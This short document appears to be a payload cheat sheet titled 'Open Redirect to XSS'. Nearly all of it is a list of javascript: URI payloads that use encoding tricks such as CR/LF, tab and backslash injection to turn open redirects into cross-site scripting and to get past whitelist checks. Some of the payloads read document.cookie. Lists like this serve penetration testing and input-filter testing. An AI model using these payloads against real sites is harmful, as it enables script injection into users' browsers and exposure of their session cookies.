# Open Redirect to XSS

### Payloads

```javascript
javascript:alert(1)
java%0d%0ascript%0d%0a:alert(0)
javascript://%250Aalert(1)
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0
%09Jav%09ascript:alert(document.domain)
javascript://%250Alert(document.location=document.cookie)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
javascript://%0aalert(1)
<>javascript:alert(1);
//javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1);
/javascript:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
javascript:alert(1);
javascript:alert(1)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
javascript:confirm(1)
javascript://https://whitelisted.com/?z=%0Aalert(1)
javascript:prompt(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
```

